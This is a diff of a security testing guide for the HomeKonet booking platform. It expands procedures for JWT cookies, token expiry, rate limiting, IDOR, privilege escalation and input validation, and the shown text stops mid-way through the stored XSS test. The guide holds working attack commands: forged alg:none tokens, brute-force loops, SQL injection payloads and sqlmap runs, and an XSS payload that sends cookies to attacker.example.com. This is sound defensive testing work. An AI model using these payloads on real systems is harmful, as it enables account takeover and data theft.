@@ -1,8 +1,36 @@
 # Security Testing Guide — HomeKonet
 
-> **Audience:** developers, QA engineers, and the security reviewer.
-> **Scope:** covers all layers of the HomeKonet stack — Django REST backend, React/TypeScript frontend, Stripe payment flow, file uploads, and infrastructure.
-> **When to run:** before every production deployment and whenever a new feature touches auth, payments, or user data.
+> **Audience:** developers, QA engineers, and the security reviewer.  
+> **Scope:** Django REST backend, React/TypeScript frontend, Stripe payments, file uploads, WebSocket messaging, infrastructure.  
+> **When to run:** before every production deployment and whenever a feature touches auth, payments, or user data.
+
+---
+
+## Tool Index
+
+Install these once. Each test references which tools are needed.
+
+| Tool | Purpose | Install |
+|---|---|---|
+| **curl** | HTTP request crafting | Ships with macOS/Linux; Windows: `winget install curl` |
+| **Burp Suite Community** | Intercept, replay, fuzz HTTP traffic | https://portswigger.net/burp/communitydownload |
+| **OWASP ZAP** | DAST — active + passive scanning | https://www.zaproxy.org/download/ or `docker pull owasp/zap2docker-stable` |
+| **sqlmap** | Automated SQL injection scanner | https://sqlmap.org / `pip install sqlmap` |
+| **Bandit** | Python static analysis for security bugs | `pip install bandit` |
+| **Safety** | Python dependency CVE checker | `pip install safety` |
+| **Semgrep** | Semantic code pattern scanner | `pip install semgrep` |
+| **Trivy** | Docker image CVE scanner | https://github.com/aquasecurity/trivy |
+| **Gitleaks** | Secret detection in git history | https://github.com/gitleaks/gitleaks |
+| **detect-secrets** | Pre-commit secret baseline | `pip install detect-secrets` |
+| **jwt.io** | Decode and inspect JWT tokens | https://jwt.io (browser tool) |
+| **securityheaders.com** | HTTP header grader | https://securityheaders.com |
+| **Mozilla Observatory** | TLS + header audit | https://observatory.mozilla.org |
+| **haveibeenpwned** | Check if test credentials are breached | https://haveibeenpwned.com/API/v3 |
+| **pre-commit** | Git hook runner | `pip install pre-commit` |
+| **openssl** | HMAC signing for webhook tests | Ships with macOS/Linux |
+| **jq** | JSON parsing in shell scripts | `brew install jq` / `apt install jq` |
+| **nc (netcat)** | Port connectivity checks | Ships with most Unix systems |
+| **dd** | Generate large test files | Ships with Unix |
 
 ---
 
@@ -49,1005 +77,1726 @@ Browser  ──►  React SPA  ──►  Django REST API  ──►  PostgreSQL
                 │                    │
                 │               Stripe API
                 │               Cloud Storage (images)
-                │               Email provider (SMTP)
-                └──► WebSocket (messaging)
+                │               Email provider (SMTP / Anymail)
+                └──► WebSocket (messaging, typing indicators)
 ```
 
 ### Most Likely Threat Actors
 
-- **Malicious guest:** attempts to read another user's bookings, steal a host's contact info, or book at manipulated prices.
-- **Malicious host:** lists a fraudulent property, approves their own listing, or extracts guest PII via messaging.
-- **External attacker:** credential stuffing, XSS via stored listing content, SSRF via image URLs, payment replay attacks.
-- **Insider / compromised admin:** approves listings in bulk, exports user data, escalates their own account.
+| Actor | Goal |
+|---|---|
+| Malicious guest | Read other users' bookings, book at manipulated prices |
+| Malicious host | Publish fraudulent listings, extract guest PII via messaging |
+| External attacker | Credential stuffing, stored XSS, payment replay, SSRF |
+| Insider / compromised admin | Bulk-approve listings, export user data, self-escalate |
+
+### References
+- OWASP Threat Modeling: https://owasp.org/www-community/Threat_Modeling
+- STRIDE methodology: https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats
 
 ---
 
 ## 2. Authentication & Session Security
 
-### 2.1 Secret Key — Environment Variable
-
-```bash
-# Must NOT be hardcoded in settings.py
-grep -rn "SECRET_KEY" backend/ --include="*.py" | grep -v "os.environ\|env(\|config("
-
-# .env must be git-ignored
-cat .gitignore | grep "\.env"
-```
-
-**Pass criteria:** No hardcoded key. `.env` appears in `.gitignore`.
-
 ---
 
-### 2.2 JWT Token — httpOnly Cookie
+### TEST-AUTH-01 — SECRET_KEY Not Hardcoded
 
-1. Log in via the UI.
-2. DevTools → Application → Cookies → select the backend domain.
-3. Find `refresh_token`.
+**CWE:** CWE-798 (Use of Hard-coded Credentials)  
+**Tools:** grep, git  
+**Risk:** If the Django secret key is committed to version control, attackers can forge CSRF tokens and signed cookies, leading to full session compromise.
+
+**Procedure:**
+```bash
+# 1. Search for any hardcoded key in Python files
+grep -rn "SECRET_KEY\s*=" backend/ --include="*.py" \
+  | grep -v "os.environ\|env(\|config(\|getenv"
+
+# 2. Confirm the key is loaded from environment
+grep -n "SECRET_KEY" backend/settings.py
+
+# 3. Verify .env is git-ignored
+cat .gitignore | grep -E "^\.env$|^\.env\."
+
+# 4. Scan full git history for accidental commits
+git log --all --oneline --format="%H %s" | while read hash msg; do
+  git show "$hash" 2>/dev/null | grep -l "SECRET_KEY\s*=" && echo "Found in: $hash $msg"
+done
+```
 
 **Pass criteria:**
-- `HttpOnly` = ✓
-- `Secure` = ✓ (in production / HTTPS)
-- `SameSite` = `Strict` or `Lax`
+- `settings.py` reads `SECRET_KEY` from environment only.
+- `.env` appears in `.gitignore`.
+- No match in git history.
 
-**JavaScript inaccessibility test:**
-```javascript
-// Run in DevTools console — refresh_token must NOT appear
-document.cookie
-```
-
-**localStorage test:**
-```javascript
-// Both must return null
-localStorage.getItem('accessToken')
-localStorage.getItem('refreshToken')
-```
+**Sources:** [OWASP Secrets Management](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html), CWE-798
 
 ---
 
-### 2.3 Token Expiry
+### TEST-AUTH-02 — JWT httpOnly Cookie
 
-**Email verification (24h expiry):**
-```sql
--- Expire the token manually
-UPDATE authapp_user
-SET email_verification_token_expires_at = NOW() - INTERVAL '1 hour'
-WHERE email = 'test@example.com';
-```
-Click the original verification link.
-**Pass criteria:** `{"error": "Verification link has expired."}` — HTTP 400.
+**CWE:** CWE-1004 (Sensitive Cookie Without 'HttpOnly' Flag)  
+**Tools:** Browser DevTools, curl  
+**Risk:** If the refresh token is accessible from JavaScript, a single XSS vulnerability allows an attacker to steal long-lived tokens.
 
-**Password reset (1h expiry):**
-```sql
-UPDATE authapp_user
-SET password_reset_token_expires_at = NOW() - INTERVAL '2 hours'
-WHERE email = 'test@example.com';
-```
-Submit the reset form with the original token.
-**Pass criteria:** `{"error": "Invalid or expired reset token"}` — HTTP 400.
-
-**Access token expiry:**
+**Procedure:**
 ```bash
-# Wait for the short-lived access token to expire, then call a protected endpoint
-curl -H "Authorization: Bearer <expired_token>" \
+# Step 1 — Log in and capture response headers
+curl -c cookies.txt -v \
+  -X POST https://your-backend.com/api/auth/login/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"test@example.com","password":"testpassword"}' 2>&1 \
+  | grep -i "set-cookie"
+
+# Step 2 — Verify flags in the header output
+# Expected:
+# Set-Cookie: refresh_token=<value>; HttpOnly; Secure; SameSite=Strict; Path=/api/auth/
+
+# Step 3 — Confirm JavaScript cannot read it (run in browser DevTools console after login)
+# document.cookie  →  must NOT contain refresh_token
+
+# Step 4 — Confirm token is not stored in browser storage
+# localStorage.getItem('accessToken')   →  null
+# localStorage.getItem('refreshToken')  →  null
+# sessionStorage.getItem('accessToken') →  null
+```
+
+**In Browser DevTools:**
+1. Login → DevTools → Application → Cookies → select backend domain.
+2. Find `refresh_token` row.
+3. Verify: `HttpOnly` ✓, `Secure` ✓ (on HTTPS), `SameSite` = Strict or Lax.
+
+**Pass criteria:** All four checks above return the expected result. No token is readable from JavaScript.
+
+**Sources:** [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html), CWE-1004, RFC 6265
+
+---
+
+### TEST-AUTH-03 — Token Expiry Enforced
+
+**CWE:** CWE-613 (Insufficient Session Expiration)  
+**Tools:** curl, PostgreSQL CLI (`psql`)  
+**Risk:** Tokens that never expire remain valid indefinitely after a credential theft.
+
+**Email verification token (24h):**
+```bash
+# 1. Register a new test user
+curl -X POST https://your-backend.com/api/auth/register/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"expiry_test","email":"expiry@example.com","password":"Pass1234!"}'
+
+# 2. Manually expire the token in the database
+psql $DATABASE_URL -c "
+  UPDATE authapp_user
+  SET email_verification_token_expires_at = NOW() - INTERVAL '1 hour'
+  WHERE email = 'expiry@example.com';"
+
+# 3. Click the verification link from the email (or POST the token directly)
+TOKEN="<token_from_email>"
+curl -X POST https://your-backend.com/api/auth/verify-email/ \
+  -H "Content-Type: application/json" \
+  -d "{\"token\": \"$TOKEN\"}"
+
+# Expected: HTTP 400 {"error": "Verification link has expired."}
+```
+
+**Password reset token (1h):**
+```bash
+# 1. Request a password reset
+curl -X POST https://your-backend.com/api/auth/forgot-password/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"expiry@example.com"}'
+
+# 2. Expire the reset token
+psql $DATABASE_URL -c "
+  UPDATE authapp_user
+  SET password_reset_token_expires_at = NOW() - INTERVAL '2 hours'
+  WHERE email = 'expiry@example.com';"
+
+# 3. Submit the expired token
+RESET_TOKEN="<token_from_email>"
+curl -X POST https://your-backend.com/api/auth/reset-password/ \
+  -H "Content-Type: application/json" \
+  -d "{\"token\":\"$RESET_TOKEN\",\"new_password\":\"NewPass5678!\"}"
+
+# Expected: HTTP 400 {"error": "Invalid or expired reset token"}
+```
+
+**Access token short-lived check:**
+```bash
+# Wait for the access token TTL to pass (usually 5–15 minutes)
+# Then hit a protected endpoint with the old token
+OLD_TOKEN="<captured_access_token>"
+curl -H "Authorization: Bearer $OLD_TOKEN" \
   https://your-backend.com/api/auth/me/
-# Pass: 401 Unauthorized — not a silent success
+# Expected: HTTP 401 {"error": "Token has expired"}
 ```
+
+**Sources:** [OWASP Auth Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html), CWE-613
 
 ---
 
-### 2.4 JWT Algorithm Confusion (alg:none Attack)
+### TEST-AUTH-04 — JWT Algorithm Confusion (alg:none)
 
+**CWE:** CWE-327 (Use of a Broken/Risky Cryptographic Algorithm)  
+**Tools:** curl, base64, jwt.io  
+**Risk:** If the backend accepts `"alg":"none"`, an attacker can craft a valid-looking token with any claims without knowing the secret key.
+
+**Procedure:**
 ```bash
-TOKEN="<your_access_token>"
-
-# Craft a token with alg=none and escalated claims
-FAKE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=')
-FAKE_PAYLOAD=$(echo -n '{"user_id":1,"is_admin":true,"is_staff":true}' | base64 | tr -d '=')
-FAKE_TOKEN="${FAKE_HEADER}.${FAKE_PAYLOAD}."
-
-curl -H "Authorization: Bearer $FAKE_TOKEN" \
-  https://your-backend.com/api/admin/dashboard/
-# Pass: 401 Unauthorized
-```
-
----
-
-### 2.5 Brute Force / Rate Limiting
-
-```bash
-# 20 rapid failed logins
-for i in {1..20}; do
-  curl -s -o /dev/null -w "%{http_code}\n" \
-    -X POST https://your-backend.com/api/auth/login/ \
-    -H "Content-Type: application/json" \
-    -d "{\"username\":\"victim@example.com\",\"password\":\"wrong$i\"}"
-done
-
-# Pass: 429 Too Many Requests appears before the 20th attempt
-```
-
----
-
-### 2.6 Token Invalidation on Logout
-
-```bash
-# 1. Log in and capture the access token
+# Step 1 — Obtain a real token
 TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
   -H "Content-Type: application/json" \
   -d '{"username":"user@example.com","password":"password"}' \
   | jq -r '.access')
 
-# 2. Log out
-curl -X POST https://your-backend.com/api/auth/logout/ \
-  -H "Authorization: Bearer $TOKEN"
+# Step 2 — Decode the payload to understand the structure
+echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq .
 
-# 3. Attempt to use the old token
-curl -H "Authorization: Bearer $TOKEN" \
-  https://your-backend.com/api/auth/me/
+# Step 3 — Craft a token with alg=none and escalated claims
+FAKE_HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
+FAKE_PAYLOAD=$(echo -n '{"user_id":1,"is_admin":true,"is_staff":true,"exp":9999999999}' \
+  | base64 | tr -d '=' | tr '/+' '_-')
+FAKE_TOKEN="${FAKE_HEADER}.${FAKE_PAYLOAD}."
 
-# Pass: 401 Unauthorized (token blacklisted server-side)
+# Step 4 — Attempt to access admin endpoint
+curl -v -H "Authorization: Bearer $FAKE_TOKEN" \
+  https://your-backend.com/api/admin/dashboard/
+
+# Also test with RS256→HS256 confusion if the backend supports multiple algorithms
+# Use jwt.io to craft a token signed with HS256 using the public key as the secret
+
+# Expected: HTTP 401 Unauthorized for all fake tokens
 ```
+
+**Sources:** [JWT Security Best Practices (OWASP)](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html), CVE-2015-9235, CWE-327
 
 ---
 
-### 2.7 OTP Entropy and Reuse
+### TEST-AUTH-05 — Brute Force / Rate Limiting
 
-1. Trigger the OTP flow.
-2. Inspect the OTP: must be exactly 6 digits (0–9).
-3. Use the OTP once successfully.
-4. Submit the same OTP again immediately.
+**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts)  
+**Tools:** curl, Burp Suite Intruder  
+**Risk:** Unthrottled login endpoints allow password spraying and credential stuffing attacks.
 
-**Pass criteria:** Second use returns an error. OTP is single-use.
+**Procedure (curl):**
+```bash
+# Send 25 rapid login attempts with wrong passwords
+for i in $(seq 1 25); do
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST https://your-backend.com/api/auth/login/ \
+    -H "Content-Type: application/json" \
+    -d "{\"username\":\"target@example.com\",\"password\":\"wrong$i\"}")
+  echo "Attempt $i: HTTP $CODE"
+  [ "$CODE" = "429" ] && echo "Rate limit triggered at attempt $i" && break
+done
+```
+
+**Procedure (Burp Suite Intruder):**
+1. Capture a `POST /api/auth/login/` request in Burp Proxy.
+2. Send to Intruder → Sniper mode.
+3. Highlight the `password` field value → Add § markers.
+4. Payloads tab → Simple list → paste a common password list (e.g., `rockyou.txt` top 100).
+5. Start attack → watch for a 429 response.
+
+**Pass criteria:** HTTP 429 returned after no more than 10 failed attempts from the same IP. A `Retry-After` header is present.
+
+**Sources:** [OWASP Testing for Brute Force](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism), CWE-307
+
+---
+
+### TEST-AUTH-06 — Token Invalidation on Logout
+
+**CWE:** CWE-613 (Insufficient Session Expiration)  
+**Tools:** curl, jq  
+**Risk:** If old tokens remain valid after logout, a stolen token can be used indefinitely even after the user changes their password.
+
+**Procedure:**
+```bash
+# Step 1 — Log in and capture the access token
+TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"user@example.com","password":"password"}' \
+  | jq -r '.access')
+
+echo "Token: $TOKEN"
+
+# Step 2 — Confirm it works
+curl -s -o /dev/null -w "Pre-logout: %{http_code}\n" \
+  -H "Authorization: Bearer $TOKEN" \
+  https://your-backend.com/api/auth/me/
+
+# Step 3 — Log out
+curl -s -X POST https://your-backend.com/api/auth/logout/ \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json"
+
+# Step 4 — Attempt to use the same token after logout
+curl -s -o /dev/null -w "Post-logout: %{http_code}\n" \
+  -H "Authorization: Bearer $TOKEN" \
+  https://your-backend.com/api/auth/me/
+
+# Expected: Pre-logout → 200, Post-logout → 401
+```
+
+**Sources:** [OWASP Session Termination](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#session-expiration), CWE-613
+
+---
+
+### TEST-AUTH-07 — OTP Single-Use and Entropy
+
+**CWE:** CWE-330 (Use of Insufficiently Random Values), CWE-287  
+**Tools:** Browser / email client, curl  
+**Risk:** A predictable or reusable OTP can be brute-forced or replayed.
+
+**Procedure:**
+```bash
+# Step 1 — Trigger OTP (e.g., 2FA or phone verification)
+curl -X POST https://your-backend.com/api/auth/request-otp/ \
+  -H "Content-Type: application/json" \
+  -d '{"email":"user@example.com"}'
+
+# Step 2 — Retrieve OTP from email/SMS
+OTP="<6-digit OTP from email>"
+
+# Step 3 — Verify OTP format (must be exactly 6 numeric digits)
+echo $OTP | grep -Eq '^[0-9]{6}$' && echo "Format OK" || echo "FAIL: unexpected format"
+
+# Step 4 — Use OTP once
+curl -X POST https://your-backend.com/api/auth/verify-otp/ \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"user@example.com\",\"otp\":\"$OTP\"}"
+
+# Step 5 — Immediately reuse the same OTP
+curl -X POST https://your-backend.com/api/auth/verify-otp/ \
+  -H "Content-Type: application/json" \
+  -d "{\"email\":\"user@example.com\",\"otp\":\"$OTP\"}"
+
+# Expected: Second use returns HTTP 400 {"error": "Invalid or already used OTP"}
+
+# Step 6 — Brute force check: request 5 OTPs and check for patterns
+for i in $(seq 1 5); do
+  curl -s -X POST https://your-backend.com/api/auth/request-otp/ \
+    -H "Content-Type: application/json" \
+    -d '{"email":"user@example.com"}' | jq .
+  sleep 2
+done
+# All OTPs should be different; no sequential pattern
+```
+
+**Sources:** [OWASP OTP guidance](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html), CWE-330
 
 ---
 
 ## 3. Authorization & Access Control
 
-### 3.1 Vertical Privilege Escalation
+---
 
+### TEST-AUTHZ-01 — Vertical Privilege Escalation
+
+**CWE:** CWE-269 (Improper Privilege Management)  
+**Tools:** curl, Burp Suite Repeater  
+**Risk:** A regular user accessing admin or host-only endpoints can approve listings, view all user data, or perform bulk operations.
+
+**Procedure:**
 ```bash
-GUEST_TOKEN="<regular_user_token>"
-
-# Admin endpoint
-curl -H "Authorization: Bearer $GUEST_TOKEN" \
-  https://your-backend.com/api/admin/dashboard/
-# Pass: 403 Forbidden
-
-# Pending listings (admin only)
-curl -H "Authorization: Bearer $GUEST_TOKEN" \
-  https://your-backend.com/api/listings/pending-review/
-# Pass: 403 Forbidden
-
-# Approve a listing (admin only)
-curl -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
-  https://your-backend.com/api/listings/1/approve/
-# Pass: 403 Forbidden
-
-# Create a listing (host only)
-curl -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
+# Obtain a regular (non-host, non-admin) user token
+GUEST_TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
   -H "Content-Type: application/json" \
-  -d '{"title":"Fake listing"}' \
+  -d '{"username":"guest@example.com","password":"guestpass"}' \
+  | jq -r '.access')
+
+# Test 1 — Admin dashboard
+curl -o /dev/null -w "Admin dashboard: %{http_code}\n" \
+  -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/admin/dashboard/
+
+# Test 2 — Pending listings (admin only)
+curl -o /dev/null -w "Pending listings: %{http_code}\n" \
+  -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/listings/pending-review/
+
+# Test 3 — Approve a listing (admin only)
+curl -o /dev/null -w "Approve listing: %{http_code}\n" \
+  -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/listings/1/approve/
+
+# Test 4 — Create a listing (host only)
+curl -o /dev/null -w "Create listing: %{http_code}\n" \
+  -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"title":"Fake"}' \
   https://your-backend.com/api/listings/
-# Pass: 403 Forbidden
+
+# Test 5 — Access user list (admin only)
+curl -o /dev/null -w "User list: %{http_code}\n" \
+  -H "Authorization: Bearer $GUEST_TOKEN" \
+  https://your-backend.com/api/users/
+
+# All must return: 403 Forbidden
 ```
+
+**Burp Suite approach:**
+1. Log in as admin, capture a request to `/api/admin/dashboard/` in Burp.
+2. Send to Repeater.
+3. Replace the `Authorization` header with the guest token.
+4. Click Send — observe the response code.
+
+**Sources:** [OWASP WSTG-ATHZ-02](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema), CWE-269
 
 ---
 
-### 3.2 Horizontal Privilege Escalation (IDOR)
+### TEST-AUTHZ-02 — IDOR (Insecure Direct Object Reference)
 
-Replace IDs with ones belonging to other users. **All requests use tokens of the wrong user.**
+**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  
+**Tools:** curl, Burp Suite Repeater  
+**Risk:** The most common high-severity finding in booking platforms. Without server-side ownership checks, any user can read or modify any other user's data by guessing or enumerating IDs.
+
+**Setup:** You need two test accounts — User A and User B — and resources belonging to each.
 
 ```bash
-USER_A_TOKEN="<user_a_token>"
-USER_B_BOOKING_ID="<booking_id_owned_by_user_b>"
-HOST_B_LISTING_ID="<listing_id_owned_by_host_b>"
+# Get tokens for both test users
+TOKEN_A=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"user_a@example.com","password":"passA"}' | jq -r '.access')
 
-# Read another user's booking
-curl -H "Authorization: Bearer $USER_A_TOKEN" \
-  https://your-backend.com/api/bookings/$USER_B_BOOKING_ID/
-# Pass: 403 or 404
+TOKEN_B=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"user_b@example.com","password":"passB"}' | jq -r '.access')
 
-# Modify another host's listing
-curl -X PATCH \
-  -H "Authorization: Bearer $USER_A_TOKEN" \
+# Get a booking ID that belongs to User B
+BOOKING_B=$(curl -s -H "Authorization: Bearer $TOKEN_B" \
+  https://your-backend.com/api/bookings/ | jq -r '.[0].id')
+
+# IDOR Test 1 — Read User B's booking as User A
+curl -o /dev/null -w "Read booking IDOR: %{http_code}\n" \
+  -H "Authorization: Bearer $TOKEN_A" \
+  https://your-backend.com/api/bookings/$BOOKING_B/
+
+# IDOR Test 2 — Cancel User B's booking as User A
+curl -o /dev/null -w "Cancel booking IDOR: %{http_code}\n" \
+  -X PATCH -H "Authorization: Bearer $TOKEN_A" \
+  -H "Content-Type: application/json" \
+  -d '{"status":"cancelled"}' \
+  https://your-backend.com/api/bookings/$BOOKING_B/
+
+# Get a listing belonging to Host B
+LISTING_B=$(curl -s -H "Authorization: Bearer $TOKEN_B" \
+  https://your-backend.com/api/listings/?my=true | jq -r '.[0].id')
+
+# IDOR Test 3 — Edit Host B's listing as User A
+curl -o /dev/null -w "Edit listing IDOR: %{http_code}\n" \
+  -X PATCH -H "Authorization: Bearer $TOKEN_A" \
   -H "Content-Type: application/json" \
   -d '{"title":"Hijacked"}' \
-  https://your-backend.com/api/listings/$HOST_B_LISTING_ID/
-# Pass: 403 Forbidden
+  https://your-backend.com/api/listings/$LISTING_B/
 
-# Delete another user's review
-curl -X DELETE \
-  -H "Authorization: Bearer $USER_A_TOKEN" \
-  https://your-backend.com/api/reviews/<user_b_review_id>/
-# Pass: 403 or 404
+# IDOR Test 4 — Read User B's messages
+CONV_B=$(curl -s -H "Authorization: Bearer $TOKEN_B" \
+  https://your-backend.com/api/messages/conversations/ | jq -r '.[0].id')
 
-# Access messages of another conversation
-curl -H "Authorization: Bearer $USER_A_TOKEN" \
-  https://your-backend.com/api/messages/<user_b_conversation_id>/messages/
-# Pass: 403 or 404
+curl -o /dev/null -w "Read messages IDOR: %{http_code}\n" \
+  -H "Authorization: Bearer $TOKEN_A" \
+  https://your-backend.com/api/messages/$CONV_B/messages/
+
+# All must return: HTTP 403 or 404 (never HTTP 200)
+```
+
+**Sources:** [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References), CWE-639, [PortSwigger IDOR lab](https://portswigger.net/web-security/access-control/idor)
+
+---
+
+### TEST-AUTHZ-03 — Host Self-Approval
+
+**CWE:** CWE-285 (Improper Authorization)  
+**Tools:** curl  
+**Risk:** A host who can approve their own listing bypasses the entire document verification workflow.
+
+**Procedure:**
+```bash
+HOST_TOKEN=$(curl -s -X POST https://your-backend.com/api/auth/login/ \
+  -H "Content-Type: application/json" \
+  -d '{"username":"host@example.com","password":"hostpass"}' | jq -r '.access')
+
+# Get the host's own listing ID (in pending_review state)
+LISTING_ID=$(curl -s -H "Authorization: Bearer $HOST_TOKEN" \
+  https://your-backend.com/api/listings/?my=true \
+  | jq -r '.[] | select(.status=="pending_review") | .id' | head -1)
+
+# Attempt to approve it
+curl -v -X POST \
+  -H "Authorization: Bearer $HOST_TOKEN" \
+  https://your-backend.com/api/listings/$LISTING_ID/approve/
+
+# Expected: HTTP 403 Forbidden
 ```
 
 ---
 
-### 3.3 Booking ID Not Exposed in URL
+### TEST-AUTHZ-04 — Booking Status Direct Override
 
-1. Complete a booking.
-2. Inspect the `/booking/confirmed` page URL and all network requests.
+**CWE:** CWE-285  
+**Tools:** curl  
+**Risk:** A guest who can directly set `status=confirmed` bypasses the host approval step.
 
-**Pass criteria:** No sequential integer ID appears in the browser address bar or referrer headers. IDs in API responses should be UUIDs.
-
----
-
-### 3.4 Host Self-Approval
-
+**Procedure:**
 ```bash
-HOST_TOKEN="<host_user_token>"
-OWN_LISTING_ID="<listing_id_owned_by_this_host>"
+GUEST_TOKEN="<guest token>"
+BOOKING_ID="<booking ID in 'requested' state>"
 
-curl -X POST \
-  -H "Authorization: Bearer $HOST_TOKEN" \
-  https://your-backend.com/api/listings/$OWN_LISTING_ID/approve/
+# Attempt 1 — Guest sets their own booking to confirmed
+curl -o /dev/null -w "Guest self-confirm: %{http_code}\n" \
+  -X PATCH -H "Authorization: Bearer $GUEST_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"status":"confirmed"}' \
+  https://your-backend.com/api/bookings/$BOOKING_ID/
 
-# Pass: 403 Forbidden — only admins may approve
+# Attempt 2 — Inject status in the initial booking POST
+curl -o /dev/null -w "Status in POST: %{http_code}\n" \
+  -X POST -H "Authorization: Bearer $GUEST_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "listing":1,
+    "start_date":"2026-07-01",
+    "end_date":"2026-07-05",
+    "guests":2,
+    "status":"confirmed",
+    "payment_status":"paid"
+  }' \
+  https://your-backend.com/api/bookings/
+
+# Expected: Both return 403 or the status field is silently ignored (booking created as "requested")
 ```
 
 ---
 
 ## 4. API Input Validation
 
-### 4.1 SQL Injection
+---
 
+### TEST-INPUT-01 — SQL Injection
+
+**CWE:** CWE-89 (SQL Injection)  
+**Tools:** curl, sqlmap, Burp Suite  
+**Risk:** SQL injection on a Django ORM app is rare but possible in raw queries or `extra()` calls.
+
+**Manual tests:**
 ```bash
-# Search parameter injection
-curl "https://your-backend.com/api/listings/?location=London'%20OR%201=1--"
-curl "https://your-backend.com/api/listings/?min_price=0%20UNION%20SELECT%201,2,3--"
+BASE="https://your-backend.com/api/listings/"
 
-# Booking date injection
+# Classic injection in query string
+curl -s "$BASE?location=London'%20OR%201=1--" | jq 'length'
+curl -s "$BASE?location=London'%20AND%201=2--" | jq 'length'
+curl -s "$BASE?min_price=0%20UNION%20SELECT%201,2,3,4,5--" | jq .
+
+# Time-based blind (if boolean-based doesn't work)
+time curl -s "$BASE?location=London'%3BSELECT%20pg_sleep(5)--" > /dev/null
+# If the request takes ~5s more than usual, time-based injection may be possible
+
+# In POST body
 curl -X POST https://your-backend.com/api/bookings/ \
   -H "Authorization: Bearer $TOKEN" \
   -H "Content-Type: application/json" \
-  -d '{"listing":1,"start_date":"2026-06-01'\''OR'\''1'\''='\''1"}'
-
-# Pass: Normal results, 400 validation error, or 500 logged server-side (never a DB dump in the response)
+  -d '{"listing":"1 OR 1=1","start_date":"2026-06-01","end_date":"2026-06-05"}'
 ```
 
-**Automated:** `sqlmap -u "https://your-backend.com/api/listings/?location=test" --level=3 --risk=2 --batch`
+**Automated (sqlmap):**
+```bash
+# Basic scan of a search parameter
+sqlmap -u "https://your-backend.com/api/listings/?location=London" \
+  --level=3 --risk=2 --batch --dbms=postgresql \
+  --headers="Authorization: Bearer $TOKEN"
+
+# POST body scan
+sqlmap -u "https://your-backend.com/api/bookings/" \
+  --method=POST \
+  --data='{"listing":1,"start_date":"2026-06-01"}' \
+  --headers="Authorization: Bearer $TOKEN\nContent-Type: application/json" \
+  --level=3 --batch
+```
+
+**Pass criteria:** No database data returned in responses. No 500 errors exposing SQL. `time` command shows no unusual delay.
+
+**Sources:** [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection), [sqlmap docs](https://sqlmap.org), CWE-89
 
 ---
 
-### 4.2 Stored XSS
+### TEST-INPUT-02 — Stored XSS
 
+**CWE:** CWE-79 (Cross-Site Scripting)  
+**Tools:** curl, browser  
+**Risk:** If a malicious host injects a script into a listing title or description, it executes in the browser of every guest who views the listing.
+
+**Procedure:**
 ```bash
-# Inject script into a listing title
+HOST_TOKEN="<host token>"
+
+# Step 1 — Create a listing with XSS payloads in text fields
 curl -X POST https://your-backend.com/api/listings/ \
-  -H "Authorization: Bearer <host_token>" \
+  -H "Authorization: Bearer $HOST_TOKEN" \
   -H "Content-Type: application/json" \
   -d '{
-    "title": "<script>fetch(\"https://attacker.com?c=\"+document.cookie)</script>",
-    "description": "<img src=x onerror=alert(1)>",
-    "propertyType": "apartment"
+    "title": "<script>fetch(\"https://attacker.example.com?c=\"+document.cookie)</script>",
+    "description": "<img src=x onerror=\"alert(document.domain)\">",
+    "location": {"city": "<svg onload=alert(1)>", "state": "Test"},
+    "propertyType": "apartment",
+    "price": 100,
+    "maxGuests": 2
   }'
 
-# Then view that listing as a different user in a browser
-# Pass: Script tags are escaped; no alert dialog; no network request to attacker.com
+LISTING_ID="<id from response>"
+
+# Step 2 — View the listing as a different user in a real browser
+# Navigate to: https://your-frontend.com/rooms/$LISTING_ID
+
+# Step 3 — Inspect the rendered HTML source
+curl -s "https://your-backend.com/api/listings/$LISTING_ID/" \
+  | jq '.title,.description' \
+  | grep -E "<script|onerror|onload|javascript:"
+
+# Step 4 — Check network requests for unexpected calls to attacker.example.com
